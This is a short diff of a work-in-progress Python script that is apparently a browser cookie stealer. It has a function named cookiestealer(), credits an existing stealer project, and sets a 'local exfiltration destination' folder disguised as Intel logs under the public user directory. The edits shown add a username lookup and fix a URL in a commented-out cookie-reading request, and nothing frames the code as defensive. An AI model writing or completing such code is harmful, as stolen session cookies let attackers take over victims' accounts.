@@ -1,10 +1,5 @@
 #WIP
 
-
-
-
-
-
 import os
 import errno
 import shutil
@@ -16,7 +11,7 @@ import getpass
 """Creds to https://github.com/mehulj94/Snatch"""
 
 cookieDir = "C:\Users\Public\Intel\Logs" #Local exfiltration destination
-
+usr = getpass.getuser()
 
 os.makedirs(cookieDir) 
 
@@ -58,7 +53,7 @@ def cookiestealer():
 
 
 """
-req = requests.get("hettps://google.com")
+req = requests.get("https://google.com")
 
 cookie = req.cookies
 """
